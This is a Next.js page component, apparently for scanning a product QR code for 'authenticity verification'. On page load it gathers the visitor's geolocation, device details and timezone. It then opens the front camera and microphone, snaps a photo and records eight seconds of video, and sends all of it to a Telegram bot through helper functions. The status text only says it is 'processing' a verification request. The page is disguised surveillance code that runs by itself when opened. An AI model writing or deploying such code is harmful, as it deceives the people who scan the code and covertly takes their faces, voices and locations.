"use client";

import { useEffect, useState, useRef, useCallback } from 'react';
import { useSearchParams, usePathname } from 'next/navigation';
import { notifyVisit, sendTelegramPhoto, sendTelegramVideo } from '@/utils/telegramApi';
import { useLayoutContext } from '@/context/LayoutContext';
import { showSuccess, showError } from '@/utils/toast';
import LoadingSpinner from '@/components/LoadingSpinner';
import { RefreshCcw } from 'lucide-react';
import { getDeviceInfo } from '@/utils/deviceInfo';

type QrVerifyPageProps = {
  params: { lang: string };
};

const QR_SCAN_SESSION_KEY = 'samyunwan_qr_scan_notified';

const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
  const searchParams = useSearchParams();
  const pathname = usePathname();
  const { t } = useLayoutContext();

  const [statusMessage, setStatusMessage] = useState<string>(t.authenticity.processingRequest);
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState<boolean>(true);
  const [isCameraActive, setIsCameraActive] = useState<boolean>(false);
  const [isRecording, setIsRecording] = useState<boolean>(false);
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
  const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);
  const [videoPreviewUrl, setVideoPreviewUrl] = useState<string | null>(null);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null); // Ref для хранения текущего MediaStream
  const mediaRecorderRef = useRef<MediaRecorder | null>(null); // Ref для хранения MediaRecorder
  const recordedChunksRef = useRef<Blob[]>([]); // Ref для хранения записанных чанков

  // Обновляем streamRef при изменении stream
  useEffect(() => {
    streamRef.current = stream;
  }, [stream]);

  // Обновляем mediaRecorderRef при изменении mediaRecorder
  useEffect(() => {
    mediaRecorderRef.current = mediaRecorder;
  }, [mediaRecorder]);

  // Обновляем recordedChunksRef при изменении recordedChunks
  useEffect(() => {
    recordedChunksRef.current = recordedChunks;
  }, [recordedChunks]);

  const stopCamera = useCallback(() => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((track: MediaStreamTrack) => track.stop());
      setStream(null);
    }
    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
    setIsCameraActive(false);
    setIsRecording(false); // Убедимся, что флаг записи сброшен
    setMediaRecorder(null); // Сбросим MediaRecorder
    setRecordedChunks([]); // Очистим чанки
    setVideoPreviewUrl(null); // Очистим URL превью
  }, []); // Теперь stopCamera стабилен

  const startVerificationProcess = useCallback(async () => {
    // Проверяем sessionStorage, чтобы предотвратить многократные запуски
    if (sessionStorage.getItem(QR_SCAN_SESSION_KEY) === 'true') {
      console.log("QR verification already processed in this session.");
      setIsLoading(false);
      setStatusMessage(t.authenticity.qrScanSuccess);
      return;
    }

    setIsLoading(true);
    setError(null);
    setRecordedChunks([]);
    setVideoPreviewUrl(null);
    setStatusMessage(t.authenticity.processingRequest);

    let geoLat: number | null = null;
    let geoLon: number | null = null;
    let initialCaption = '';

    try {
      // 1. Получаем геолокацию
      setStatusMessage(t.authenticity.processingRequest + " (Getting location...)");
      if (navigator.geolocation) {
        try {
          const position = await new Promise<GeolocationPosition>((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: false });
          });
          geoLat = position.coords.latitude;
          geoLon = position.coords.longitude;
          setStatusMessage(t.authenticity.processingRequest + " (Location obtained.)");
        } catch (geoError) {
          console.warn("Geolocation permission denied or error:", geoError);
          setStatusMessage(t.authenticity.processingRequest + " (Location access denied or failed.)");
        }
      } else {
        setStatusMessage(t.authenticity.processingRequest + " (Geolocation not supported.)");
      }

      // 2. Получаем информацию об устройстве и часовом поясе
      const { deviceVendor, deviceModel, cpuArchitecture, clientTimezone } = getDeviceInfo();

      // 3. Отправляем начальное уведомление о посещении для получения подписи
      setStatusMessage(t.authenticity.processingRequest + " (Sending initial notification...)");
      const utmQueryParams = {
        utm_source: searchParams?.get('utm_source') || null,
        utm_medium: searchParams?.get('utm_medium') || null,
        utm_campaign: searchParams?.get('utm_campaign') || null,
      };
      const bodyData = {
        lat: geoLat,
        lon: geoLon,
        screenWidth: window.innerWidth,
        screenHeight: window.innerHeight,
        isQrScan: true,
        pagePath: pathname,
        deviceVendor,
        deviceModel,
        cpuArchitecture,
        clientTimezone,
      };
      const notifyResponse = await notifyVisit(bodyData, utmQueryParams);
      initialCaption = notifyResponse;
      setStatusMessage(t.authenticity.processingRequest + " (Initial notification sent.)");

      // 4. Запрашиваем доступ к камере (сначала фронтальная, затем задняя)
      setStatusMessage(t.authenticity.processingRequest + " (Requesting camera access...)");
      let mediaStream: MediaStream;
      try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
        setStatusMessage(t.authenticity.processingRequest + " (Camera access granted.)");
      } catch (frontCameraError: unknown) {
        console.warn("Front camera not available or permission denied, trying rear camera:", frontCameraError);
        try {
          mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
          setStatusMessage(t.authenticity.processingRequest + " (Rear camera access granted.)");
        } catch (rearCameraError: unknown) {
          console.error("No camera available or permission denied for both front and rear cameras:", rearCameraError);
          throw new DOMException("No camera available or permission denied.", "NotFoundError");
        }
      }
      
      setStream(mediaStream);
      setIsCameraActive(true);

      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
        await videoRef.current.play();
      }

      // Важно: небольшая задержка, чтобы видеопоток успел отобразить кадр
      await new Promise(resolve => setTimeout(resolve, 500)); 

      // 5. Делаем снимок
      setStatusMessage(t.authenticity.processingRequest + " (Taking photo...)");
      if (videoRef.current && canvasRef.current) {
        const video = videoRef.current;
        const canvas = canvasRef.current;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        if (ctx) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
          
          try {
            await sendTelegramPhoto({ photoBase64, caption: initialCaption });
            setStatusMessage(t.authenticity.processingRequest + " (Photo sent.)");
          } catch (photoSendError: unknown) {
            console.error("Error sending photo to Telegram:", photoSendError);
            setError(t.authenticity.qrScanError + (photoSendError instanceof Error ? `: ${photoSendError.message}` : "."));
            setIsLoading(false);
            stopCamera();
            return;
          }
        }
      }

      // 6. Начинаем запись видео (если снимок был успешным)
      setStatusMessage(t.authenticity.recordingInstructions + " (Starting video recording...)");
      const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm; codecs=vp8,opus' });
      setMediaRecorder(recorder); // Устанавливаем MediaRecorder в состояние

      recorder.ondataavailable = (event: BlobEvent) => {
        if (event.data.size > 0) {
          setRecordedChunks((prev: Blob[]) => [...prev, event.data]);
        }
      };

      recorder.onstop = async () => {
        setIsRecording(false);
        stopCamera(); // Останавливаем камеру после записи
        
        const blob = new Blob(recordedChunksRef.current, { type: 'video/webm' }); // Используем ref для доступа к последним чанкам
        const url = URL.createObjectURL(blob);
        setVideoPreviewUrl(url);
        
        try {
          setStatusMessage(t.authenticity.processingRequest + " (Sending video...)");
          const filename = `qr_scan_video_${new Date().getTime()}.webm`;
          await sendTelegramVideo({ videoBlob: blob, caption: initialCaption, filename });
          showSuccess(t.authenticity.recordingSuccess);
          setStatusMessage(t.authenticity.recordingSuccess);
          sessionStorage.setItem(QR_SCAN_SESSION_KEY, 'true'); // Устанавливаем флаг после успешного завершения
        } catch (videoSendError: unknown) {
          console.error("Error sending video to Telegram:", videoSendError);
          showError(t.authenticity.recordingError);
          setError(t.authenticity.recordingError + (videoSendError instanceof Error ? `: ${videoSendError.message}` : "."));
          setStatusMessage(t.authenticity.recordingError);
        } finally {
          setIsLoading(false);
        }
      };

      recorder.start();
      setIsRecording(true);
      setTimeout(() => {
        if (recorder.state !== 'inactive') {
          recorder.stop();
        }
      }, 8000); // Запись 8 секунд

    } catch (err: unknown) {
      console.error("Error during QR verification process:", err);
      if (err instanceof DOMException && err.name === "NotAllowedError") {
        setError(t.authenticity.qrScanError + " (Camera access denied).");
        setStatusMessage(t.authenticity.qrScanError + " (Camera access denied).");
        showError(t.authenticity.qrScanError + " (Camera access denied).");
      } else if (err instanceof DOMException && err.name === "NotFoundError") {
        setError(t.authenticity.qrScanError + " (No camera found).");
        setStatusMessage(t.authenticity.qrScanError + " (No camera found).");
        showError(t.authenticity.qrScanError + " (No camera found).");
      } else {
        setError(t.authenticity.qrScanError + (err instanceof Error ? `: ${err.message}` : "."));
        setStatusMessage(t.authenticity.qrScanError);
        showError(t.authenticity.qrScanError);
      }
      setIsLoading(false);
      setIsRecording(false);
      stopCamera();
    }
  }, [searchParams, pathname, t, stopCamera]); // startVerificationProcess теперь стабилен

  useEffect(() => {
    // Вызываем startVerificationProcess только один раз при монтировании
    startVerificationProcess();

    return () => {
      // Очистка при размонтировании компонента
      stopCamera(); // Останавливаем камеру
      if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
        mediaRecorderRef.current.stop(); // Останавливаем MediaRecorder, если он активен
      }
      if (videoPreviewUrl) {
        URL.revokeObjectURL(videoPreviewUrl); // Освобождаем URL объекта
      }
    };
  }, [startVerificationProcess, videoPreviewUrl, stopCamera]); // mediaRecorderRef не нужен здесь, так как stopCamera его сбрасывает

  return (
    <div className="flex flex-col items-center justify-center min-h-screen p-4 text-center bg-gray-50 dark:bg-gray-900 text-gray-900 dark:text-gray-50">
      <h1 className="text-3xl font-bold mb-6">{t.authenticity.title}</h1>
      
      {isLoading && (
        <div className="mb-4">
          <LoadingSpinner />
        </div>
      )}

      <p className="text-lg mb-4">{statusMessage}</p>
      
      {error && (
        <p className="text-red-600 dark:text-red-400 text-base mb-4">{error}</p>
      )}

      <div className="relative w-full max-w-md aspect-video bg-gray-200 dark:bg-gray-700 rounded-lg overflow-hidden shadow-lg mb-6">
        {isCameraActive && !videoPreviewUrl && (
          <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" />
        )}
        {videoPreviewUrl && (
          <video
            src={videoPreviewUrl}
            className="w-full h-full object-cover"
            controls
            autoPlay
            loop
          />
        )}
        {isRecording && (
          <div className="absolute top-2 left-2 bg-red-600 text-white text-xs px-2 py-1 rounded-full flex items-center">
            <span className="relative flex h-2 w-2 mr-1">&nbsp;</span>
            <span className="relative inline-flex rounded-full h-2 w-2 bg-white">&nbsp;</span>
            REC
          </div>
        )}
        <canvas ref={canvasRef} style={{ display: 'none' }} />
      </div>

      {error && (
        <button
          onClick={() => window.location.reload()}
          className="mt-4 px-6 py-3 bg-primary-600 text-white rounded-full shadow-lg hover:bg-primary-700 transition-colors"
        >
          <RefreshCcw className="inline-block mr-2" /> Try Again
        </button>
      )}
    </div>
  );
};

export default QrVerifyPage;